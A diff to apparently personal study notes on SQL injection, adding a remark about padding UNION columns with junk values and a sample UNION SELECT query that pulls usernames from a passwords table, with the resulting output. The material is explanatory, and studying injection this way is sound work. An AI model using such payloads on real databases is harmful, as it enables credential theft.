@@ -6,7 +6,17 @@
 
 ## Recap
 
-UNION clauses allow for an additional SQL statement. It's always worth testing for this type of injection.
+UNION clauses allow for an additional SQL statement. It's always worth testing for this type of injection. WE MUST FILL ADDITIONAL COLUMNS WITH JUNK DATA.
+
+```shell-session
+mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '
+
++-----------+-----------+-----------+-----------+
+| product_1 | product_2 | product_3 | product_4 |
++-----------+-----------+-----------+-----------+
+|   admin   |    2      |    3      |    4      |
++-----------+-----------+-----------+-----------+
+```
 
 
 
